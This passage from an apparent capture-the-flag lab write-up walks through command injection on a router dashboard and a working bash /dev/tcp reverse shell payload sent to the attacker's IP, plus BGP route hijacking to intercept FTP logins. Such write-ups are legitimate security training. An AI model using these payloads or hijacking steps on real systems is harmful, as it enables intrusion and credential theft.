&lt;p&gt;Thanks to this indication, I managed to login with the following credentials: &lt;strong&gt;admin/NET_45JDX23&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;from-command-injection-to-reverse-shell&quot;&gt;From Command Injection to Reverse Shell&lt;/h3&gt;

&lt;p&gt;Once logged in, a dashboard and two other pages were accessible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-dashboard.png&quot; alt=&quot;Lyghtspeed dashboard&quot; title=&quot;Lyghtspeed dashboard&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;tickets&quot;&gt;Tickets&lt;/h4&gt;

&lt;p&gt;The &lt;strong&gt;“Tickets”&lt;/strong&gt; page gave a lot of clues about the second part of the exploitation. It was mentioning a Nigerian Prince having issues connecting to &lt;strong&gt;a FTP server&lt;/strong&gt;. &lt;strong&gt;BGP routing&lt;/strong&gt; among AS was also evoked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-tickets.png&quot; alt=&quot;Lyghtspeed tickets&quot; title=&quot;Lyghtspeed tickets&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;diagnostics&quot;&gt;Diagnostics&lt;/h4&gt;

&lt;p&gt;The “&lt;strong&gt;Diagnostics&lt;/strong&gt;” page seemed to show the output of the command &lt;code class=&quot;highlighter-rouge&quot;&gt;ps -aux | grep quagga | grep -v grep&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-diagnostics.png&quot; alt=&quot;Lyghtspeed diagnostics&quot; title=&quot;Lyghtspeed diagnostics&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After examining the &lt;strong&gt;POST request&lt;/strong&gt; sent when clicking on “Verify status” with Burp, it occurred that the &lt;strong&gt;check&lt;/strong&gt; parameter was the &lt;strong&gt;base64-encoding&lt;/strong&gt; of “quagga”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-quagga.png&quot; alt=&quot;Lyghtspeed quagga&quot; title=&quot;Lyghtspeed quagga&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s see if we can control the output by modifying this parameter:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-ssh.png&quot; alt=&quot;Lyghtspeed SSH&quot; title=&quot;Lyghtspeed SSH&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Indeed, the output has been modified to show everything related to “ssh”. Now, let’s try to inject other commands in order to &lt;strong&gt;get a reverse shell on the machine&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;SPOILER: The user flag can be retrieved without getting a reverse shell but it is mandatory for the rest of the box.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;road-to-reverse-shell&quot;&gt;Road to Reverse Shell&lt;/h4&gt;

&lt;p&gt;This one was pretty difficult to trigger, I must have tried a dozen of different reverse shell payloads before finding the right one: &lt;code class=&quot;highlighter-rouge&quot;&gt;; /bin/bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.89/9999 0&amp;gt;&amp;amp;1&quot;&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Base64&lt;/strong&gt; encode the payload: &lt;em&gt;OyAvYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODkvOTk5OSAwPiYxIg==&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Setup a &lt;strong&gt;local listener&lt;/strong&gt;: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvnp 9999&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Send the command inside the POST request via the &lt;strong&gt;check&lt;/strong&gt; parameter (Burp Repeater ).&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 9999
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9999 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.89] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.105] 58148
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;25835&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
root@r1:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Surprise! We’re root already.&lt;/p&gt;

&lt;p&gt;The user flag can be retrieved at &lt;strong&gt;/root/user.txt&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/user.txt
5649[...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Half of the job is done, let’s move on to the privilege escalation phase!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE: Only after finishing the box, I realized that I could have simply added my own ssh public key to /root/.ssh/authorized_keys, which would have allowed me to login via ssh…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h2&gt;

&lt;p&gt;Upgrading to a &lt;strong&gt;fully interactive reverse shell&lt;/strong&gt; is a good reflex to adopt as soon as we’re dealing with a reverse shell (see my other article &lt;a href=&quot;https://www.boiteaklou.fr/Fully-interactive-reverse-shell.html&quot;&gt;Upgrading to a fully interactive reverse shell&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;As a few hints suggested it, the privilege escalation part of this box is &lt;strong&gt;heavily network-related&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;network-configuration&quot;&gt;Network configuration&lt;/h3&gt;

&lt;p&gt;The first step consisted in &lt;strong&gt;understanding the network topology&lt;/strong&gt; and &lt;strong&gt;examining every configuration files&lt;/strong&gt; that could give information about it.&lt;/p&gt;

&lt;p&gt;The following diagram, available on the web server (&lt;a href=&quot;http://10.10.10.105/doc/diagram_for_tac.png&quot;&gt;http://10.10.10.105/doc/diagram_for_tac.png&lt;/a&gt;), was very helpful for understanding the network context:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-diagram.png&quot; alt=&quot;Lyghtspeed diagram&quot; title=&quot;Lyghtspeed diagram&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;network-interfaces&quot;&gt;Network interfaces&lt;/h4&gt;

&lt;p&gt;The router we’re connected to has 3 network interfaces.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# ip a
ip a
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
8: eth0@if9: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:d9:04:ea brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.99.64.2/24 brd 10.99.64.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fed9:4ea/64 scope link
       valid_lft forever preferred_lft forever
10: eth1@if11: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:8a:f2:4f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.10.1/24 brd 10.78.10.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe8a:f24f/64 scope link
       valid_lft forever preferred_lft forever
12: eth2@if13: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe20:98df/64 scope link
       valid_lft forever preferred_lft forever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;bgp-configuration&quot;&gt;BGP configuration&lt;/h4&gt;

&lt;p&gt;The BGP configuration is available in &lt;strong&gt;/etc/quagga/bgpd.conf&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/quagga/bgpd.conf
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/quagga/bgpd.conf
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; Zebra configuration saved from vty
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;   2018/07/02 02:14:27
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
route-map to-as200 permit 10
route-map to-as300 permit 10
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
line vty
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;routing-table&quot;&gt;Routing table&lt;/h4&gt;

&lt;p&gt;The routing table can be displayed using &lt;code class=&quot;highlighter-rouge&quot;&gt;ip r&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# ip r
ip r
default via 10.99.64.1 dev eth0 onlink
10.78.10.0/24 dev eth1  proto kernel  scope link  src 10.78.10.1
10.78.11.0/24 dev eth2  proto kernel  scope link  src 10.78.11.1
10.99.64.0/24 dev eth0  proto kernel  scope link  src 10.99.64.2
10.100.10.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.11.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.12.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.13.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.14.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.15.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.16.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.17.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.18.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.19.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.20.0/24 via 10.78.10.2 dev eth1  proto zebra
10.120.10.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.11.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.12.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.13.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.14.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.15.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.16.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.17.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.18.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.19.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.20.0/24 via 10.78.11.2 dev eth2  proto zebra
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;updated-network-diagram&quot;&gt;Updated network diagram&lt;/h4&gt;

&lt;p&gt;From the network configuration files, we can deduce the &lt;strong&gt;IP address of other AS routers&lt;/strong&gt;, as well as the &lt;strong&gt;subnets connected to these AS&lt;/strong&gt;. This gives the following updated diagram:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/updated-diagram.png&quot; alt=&quot;Updated diagram&quot; title=&quot;Updated diagram&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;whats-the-plan&quot;&gt;What’s the plan?&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;We know from the tickets on the web server, that there is &lt;strong&gt;a valuable FTP server&lt;/strong&gt; in the &lt;strong&gt;10.120.15.0/24 network&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Routes are &lt;strong&gt;dynamically advertised via BGP&lt;/strong&gt; and we have control over a &lt;strong&gt;BGP router&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The &lt;strong&gt;priority of BGP routes&lt;/strong&gt; depends on the &lt;strong&gt;size of the advertised subnet&lt;/strong&gt; (i.e. a route to 10.120.15.0/25 will be given a higher priority than one announcing 10.120.15.0/24).&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If we sum up all of these assumptions, we should be able to &lt;strong&gt;advertise a fake route to the FTP server&lt;/strong&gt; to our BGP neighbours so &lt;strong&gt;the Nigerian Prince will try to connect to a server inside our own subnet&lt;/strong&gt;. Since we want to &lt;strong&gt;steal his credentials&lt;/strong&gt;, we will need to &lt;strong&gt;setup an FTP server&lt;/strong&gt; which will ask for a login and a password to anyone contacting it. Once those credentials stolen, we will stop advertising the fake route and connect to the real FTP server with the Nigerian Prince’s logins.&lt;/p&gt;

&lt;p&gt;Because a picture speaks a thousand words:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/attack.png&quot; alt=&quot;Attack&quot; title=&quot;Attack&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alright, it is time to move on to the realization.&lt;/p&gt;

&lt;h3 id=&quot;1012015024-scanning&quot;&gt;10.120.15.0/24 scanning&lt;/h3&gt;

&lt;p&gt;We know the FTP server is somewhere inside the 10.120.15.0/24 subnet  but we don’t have its &lt;strong&gt;exact IP address&lt;/strong&gt;. A simple &lt;strong&gt;bash script executing &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt; on the whole subnet&lt;/strong&gt; was enough to find out which hosts were up.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;then
&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage ./pingscript.sh [network]&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else
        for &lt;/span&gt;x &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;seq 1 254&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
                &lt;/span&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;64 bytes&quot;&lt;/span&gt; | cut &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f4&lt;/span&gt; | sed &lt;span class=&quot;s1&quot;&gt;'s/.$//'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;done
fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script can be &lt;strong&gt;uploaded to r1&lt;/strong&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;wget&lt;/code&gt; on a &lt;strong&gt;local webserver running on our machine&lt;/strong&gt; that we have just set up with &lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# wget http://10.10.14.89:8000/pingscript.sh &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /tmp/script.sh
wget http://10.10.14.89:8000/pingscript.sh &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /tmp/script.sh
&lt;span class=&quot;nt&quot;&gt;--2019-03-17&lt;/span&gt; 13:26:31--  http://10.10.14.89:8000/pingscript.sh
Connecting to 10.10.14.89:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 182 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/x-sh]
Saving to: ‘/tmp/script.sh’

     0K                                                       100% 19.6M&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0s

2019-03-17 13:26:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;19.6 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘/tmp/script.sh’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;182/182]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result of the execution revealed two hosts: &lt;strong&gt;10.120.15.1&lt;/strong&gt; and &lt;strong&gt;10.120.15.10&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# chmod +x /tmp/script.sh
chmod +x /tmp/script.sh
root@r1:~# /tmp/script.sh 10.120.15
/tmp/script.sh 10.120.15
10.120.15.1
10.120.15.10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the same technique as previously, I have uploaded &lt;strong&gt;a static version of &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;&lt;/strong&gt; in order to &lt;strong&gt;scan the two hosts&lt;/strong&gt; with more details.&lt;/p&gt;

&lt;h4 id=&quot;10120151&quot;&gt;10.120.15.1&lt;/h4&gt;

&lt;p&gt;The scan on the first host found didn’t show any FTP server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# /tmp/nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.120.15.1
/tmp/nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.120.15.1

Starting Nmap 6.49BETA1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-03-17 13:36 UTC
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp

Read data files from: /etc
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.59 seconds
Raw packets sent: 1210 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;53.216KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1208 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48.388KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;101201510&quot;&gt;10.120.15.10&lt;/h4&gt;

&lt;p&gt;10.120.15.10 seems to be our guy!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# /tmp/nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.120.15.10
/tmp/nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.120.15.10

Starting Nmap 6.49BETA1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-03-17 13:38 UTC
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Read data files from: /etc
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.60 seconds
Raw packets sent: 1210 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;53.216KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1208 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48.392KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now move on to the &lt;strong&gt;BGP Hijacking&lt;/strong&gt; part.&lt;/p&gt;

&lt;h3 id=&quot;bgp-hijacking&quot;&gt;BGP Hijacking&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE: The way I did BGP Hijacking was not the intended one, but it was much easier and faster. For a clear explanation of the intended method, I recommend you to watch &lt;a href=&quot;https://www.youtube.com/watch?v=2ZxRA8BgmnA&quot;&gt;ippsec’s video&lt;/a&gt; or to read &lt;a href=&quot;https://0xdf.gitlab.io/2019/03/16/htb-carrier.html&quot;&gt;0xdf’s writeup&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;fake-route-advertising&quot;&gt;Fake route Advertising&lt;/h4&gt;

&lt;p&gt;Quagga routers can be administrated via &lt;code class=&quot;highlighter-rouge&quot;&gt;vtysh&lt;/code&gt;. In order to &lt;strong&gt;advertise a route to the BGP neighbors&lt;/strong&gt;, the following commands are enough:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# vtysh
vtysh

Hello, this is Quagga &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;version 0.99.24.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Copyright 1996-2005 Kunihiro Ishiguro, et al.

r1# conf t
conf t
r1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;config&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# router bgp 100&lt;/span&gt;
router bgp 100
r1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;config-router&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# network 10.120.15.0/25&lt;/span&gt;
network 10.120.15.0/25
r1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;config-router&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# exit&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;r1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;config&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# exit&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The prefix &lt;strong&gt;/25&lt;/strong&gt; is voluntarily more specific than &lt;strong&gt;/24&lt;/strong&gt; so that our route will be given &lt;strong&gt;a higher priority&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;changing-eth2-ip-address&quot;&gt;Changing eth2 ip address&lt;/h4&gt;

&lt;p&gt;Now, we have to &lt;strong&gt;add the ip address of the FTP server to eth2 interface&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# ip addr add 10.120.15.10/25 dev eth2
ip addr add 10.120.15.10/25 dev eth2
root@r1:~# ip a
ip a
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
12: eth2@if13: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
       valid_lft forever preferred_lft forever
    inet 10.120.15.10/25 scope global eth2
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe20:98df/64 scope link
       valid_lft forever preferred_lft forever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The Nigerian Prince should now be &lt;strong&gt;redirected to our machine&lt;/strong&gt;. We can verify this by &lt;strong&gt;listening on port 21&lt;/strong&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 21
nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 21
Listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0.0.0.0] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;family 0, port 21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;



Connection from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.78.10.2] port 21 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;tcp/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; accepted &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;family 2, sport 44696&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
USER root
PASV
QUIT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the user &lt;strong&gt;root&lt;/strong&gt; is trying to login but it &lt;strong&gt;disconnects instantly&lt;/strong&gt; since &lt;strong&gt;our server is not answering&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;faking-an-ftp-server&quot;&gt;Faking an FTP server&lt;/h3&gt;

